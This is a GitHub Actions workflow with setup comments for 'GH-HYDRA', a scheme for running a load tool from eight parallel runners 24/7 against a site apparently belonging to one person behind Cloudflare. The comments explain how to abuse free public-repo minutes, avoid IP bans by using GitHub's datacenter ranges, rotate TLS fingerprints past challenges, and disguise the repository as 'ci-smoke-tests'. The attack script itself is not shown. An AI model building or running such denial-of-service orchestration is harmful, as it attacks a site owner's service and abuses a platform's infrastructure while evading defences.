# GH-HYDRA — hydra on GitHub Actions runners (Microsoft's CPU, not ours)
# Public repo = unlimited free minutes. 8 parallel runners x ~5.5h jobs,
# scheduled every 5h = continuous 24/7 coverage from Azure IP ranges.
# CF can't ban "our IP" — these are GitHub's datacenter ranges, and if he
# challenges datacenter IPs at CF level, hydra-lite rotates fingerprints.
#
# SETUP (one-time, ~2 min):
#   1. Create a PUBLIC repo (any name, e.g. "ci-smoke-tests")
#   2. Copy this file to .github/workflows/ech.yml in that repo
#   3. Copy runner.py to repo root
#   4. git add .github/runner.py && git commit && git push
#   5. Actions tab -> ech-load -> Run workflow (or wait for the schedule)
# KILL: delete the workflow file or disable the schedule trigger.

name: ech-load

on:
  workflow_dispatch:
    inputs:
      heads:
        description: 'heads per runner'
        default: '6'
  schedule:
    # every 5 hours -> 8 runners x 5.5h jobs = seamless 24/7 relay
    - cron: '0 */5 * * *'

jobs:
  hammer:
    runs-on: ubuntu-latest
    timeout-minutes: 330
    strategy:
      fail-fast: false
      matrix:
        slot: [1, 2, 3, 4, 5, 6, 7, 8]
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: '3.11'
      - run: pip install curl_cffi
      - name: run
        env:
          HYDRA_HEADS: ${{ github.event.inputs.heads || '6' }}
        run: python runner.py
